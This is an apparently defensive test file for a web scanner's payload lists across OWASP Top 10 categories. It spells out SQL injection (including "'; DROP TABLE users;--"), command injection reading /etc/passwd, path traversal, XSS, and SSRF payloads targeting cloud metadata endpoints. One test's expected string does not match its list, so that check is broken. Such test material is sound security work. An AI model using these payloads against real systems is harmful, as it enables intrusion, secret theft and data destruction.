describe('OWASP Top 10 2021 Pattern Tests', () => {
    const GHDB_PATTERNS = [
        {
            ghdb_id: 'OWASP-A01-2021',
            title: 'Broken Access Control',
            category: 'OWASP Top 10',
            owasp_category: 'A01:2021-Broken Access Control',
            severity: 'high',
            test_paths: ['user/1', 'account/1', 'order/1']
        },
        {
            ghdb_id: 'OWASP-A02-2021',
            title: 'Cryptographic Failures',
            category: 'OWASP Top 10',
            owasp_category: 'A02:2021-Cryptographic Failures',
            severity: 'critical',
            test_paths: ['login', 'checkout', 'payment']
        },
        {
            ghdb_id: 'OWASP-A03-2021-SQL',
            title: 'Injection - SQL Injection',
            category: 'OWASP Top 10',
            owasp_category: 'A03:2021-Injection',
            severity: 'critical',
            test_paths: ['product?id=1', 'item?id=1'],
            test_payloads: ["' OR '1'='1", "' UNION SELECT null,null--"]
        },
        {
            ghdb_id: 'OWASP-A03-2021-CMD',
            title: 'Injection - Command Injection',
            category: 'OWASP Top 10',
            owasp_category: 'A03:2021-Injection',
            severity: 'critical',
            test_paths: ['ping?host=', 'lookup?domain='],
            test_payloads: ['; cat /etc/passwd', '| whoami']
        },
        {
            ghdb_id: 'OWASP-A10-2021',
            title: 'Server-Side Request Forgery (SSRF)',
            category: 'OWASP Top 10',
            owasp_category: 'A10:2021-Server-Side Request Forgery (SSRF)',
            severity: 'high',
            test_paths: ['fetch?url=', 'proxy?dest='],
            test_payloads: ['http://localhost', 'http://127.0.0.1', 'file:///etc/passwd']
        }
    ];

    describe('A01:2021 - Broken Access Control', () => {
        it('should have IDOR test paths', () => {
            const pattern = GHDB_PATTERNS.find(p => p.ghdb_id === 'OWASP-A01-2021');
            expect(pattern.test_paths).toContain('user/1');
            expect(pattern.test_paths).toContain('account/1');
        });

        it('should have high severity', () => {
            const pattern = GHDB_PATTERNS.find(p => p.ghdb_id === 'OWASP-A01-2021');
            expect(pattern.severity).toBe('high');
        });
    });

    describe('A02:2021 - Cryptographic Failures', () => {
        it('should test sensitive data endpoints', () => {
            const pattern = GHDB_PATTERNS.find(p => p.ghdb_id === 'OWASP-A02-2021');
            expect(pattern.test_paths).toContain('login');
            expect(pattern.test_paths).toContain('payment');
        });

        it('should have critical severity', () => {
            const pattern = GHDB_PATTERNS.find(p => p.ghdb_id === 'OWASP-A02-2021');
            expect(pattern.severity).toBe('critical');
        });
    });

    describe('A03:2021 - Injection', () => {
        it('should include SQL injection payloads', () => {
            const pattern = GHDB_PATTERNS.find(p => p.ghdb_id === 'OWASP-A03-2021-SQL');
            expect(pattern.test_payloads).toContain("' OR '1'='1");
            expect(pattern.test_payloads).toContain("' UNION SELECT null,null--");
        });

        it('should include command injection payloads', () => {
            const pattern = GHDB_PATTERNS.find(p => p.ghdb_id === 'OWASP-A03-2021-CMD');
            expect(pattern.test_payloads).toContain('; cat /etc/passwd');
            expect(pattern.test_payloads).toContain('| whoami');
        });
    });

    describe('A10:2021 - SSRF', () => {
        it('should include localhost targets', () => {
            const pattern = GHDB_PATTERNS.find(p => p.ghdb_id === 'OWASP-A10-2021');
            expect(pattern.test_payloads).toContain('http://localhost');
            expect(pattern.test_payloads).toContain('http://127.0.0.1');
        });

        it('should include file protocol', () => {
            const pattern = GHDB_PATTERNS.find(p => p.ghdb_id === 'OWASP-A10-2021');
            expect(pattern.test_payloads).toContain('file:///etc/passwd');
        });
    });
});

describe('Path Traversal Attack Vectors', () => {
    const pathTraversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\win.ini',
        '....//....//etc/passwd',
        '%2e%2e%2f',
        '%2e%2e/',
        '..%252f..%252f..%252fetc/passwd'
    ];

    it('should include Unix path traversal patterns', () => {
        expect(pathTraversalPayloads).toContain('../../../etc/passwd');
    });

    it('should include Windows path traversal patterns', () => {
        expect(pathTraversalPayloads).toContain('..\\..\\..\\windows\\win.ini');
    });

    it('should include encoded variations', () => {
        expect(pathTraversalPayloads).toContain('%2e%2e%2f');
        expect(pathTraversalPayloads).toContain('%2e%2e/');
    });

    it('should include double encoding bypass', () => {
        expect(pathTraversalPayloads).toContain('..%252f..%252f..%252fetc/passwd');
    });
});

describe('SQL Injection Payloads', () => {
    const sqlPayloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'#",
        "admin'--",
        "' UNION SELECT null,null--",
        "1' ORDER BY 10--",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "'; DROP TABLE users;--"
    ];

    it('should include tautology-based payloads', () => {
        expect(sqlPayloads).toContain("' OR '1'='1");
    });

    it('should include comment-based authentication bypass', () => {
        expect(sqlPayloads).toContain("admin'--");
        expect(sqlPayloads).toContain("' OR '1'='1'--");
    });

    it('should include UNION-based payloads', () => {
        expect(sqlPayloads).toContain("' UNION SELECT null,null--");
    });

    it('should include error-based payloads', () => {
        expect(sqlPayloads).toContain("1 ORDER BY 10--");
    });

    it('should include destructive payloads for testing', () => {
        expect(sqlPayloads).toContain("'; DROP TABLE users;--");
    });
});

describe('XSS Payloads', () => {
    const xssPayloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror="alert(1)">'
    ];

    it('should include script tag payloads', () => {
        expect(xssPayloads).toContain('<script>alert(1)</script>');
    });

    it('should include event handler payloads', () => {
        expect(xssPayloads).toContain('<img src=x onerror=alert(1)>');
        expect(xssPayloads).toContain('<svg onload=alert(1)>');
    });

    it('should include javascript: protocol payloads', () => {
        expect(xssPayloads).toContain('javascript:alert(1)');
    });

    it('should include autofocus-based payloads', () => {
        expect(xssPayloads).toContain('<input onfocus=alert(1) autofocus>');
    });
});

describe('Command Injection Payloads', () => {
    const cmdPayloads = {
        unix: [
            '; cat /etc/passwd',
            '| whoami',
            '&& ls -la',
            '`id`',
            '$(whoami)',
            '; uname -a',
            '| netstat -an'
        ],
        windows: [
            '& dir',
            '| type C:\\Windows\\win.ini',
            '&& ipconfig',
            '| ver'
        ]
    };

    it('should include Unix command separators', () => {
        expect(cmdPayloads.unix).toContain('; cat /etc/passwd');
        expect(cmdPayloads.unix).toContain('| whoami');
        expect(cmdPayloads.unix).toContain('&& ls -la');
    });

    it('should include command substitution', () => {
        expect(cmdPayloads.unix).toContain('`id`');
        expect(cmdPayloads.unix).toContain('$(whoami)');
    });

    it('should include Windows command separators', () => {
        expect(cmdPayloads.windows).toContain('& dir');
        expect(cmdPayloads.windows).toContain('| type C:\\Windows\\win.ini');
    });
});

describe('SSRF Payloads', () => {
    const ssrfPayloads = [
        'http://localhost',
        'http://127.0.0.1',
        'http://[::1]',
        'file:///etc/passwd',
        'http://169.254.169.254',
        'http://metadata.google.internal',
        'http://169.254.169.254/latest/meta-data/'
    ];

    it('should include localhost variations', () => {
        expect(ssrfPayloads).toContain('http://localhost');
        expect(ssrfPayloads).toContain('http://127.0.0.1');
    });

    it('should include IPv6 localhost', () => {
        expect(ssrfPayloads).toContain('http://[::1]');
    });

    it('should include cloud metadata endpoints', () => {
        expect(ssrfPayloads).toContain('http://169.254.169.254');
        expect(ssrfPayloads).toContain('http://metadata.google.internal');
    });

    it('should include file protocol', () => {
        expect(ssrfPayloads).toContain('file:///etc/passwd');
    });
});
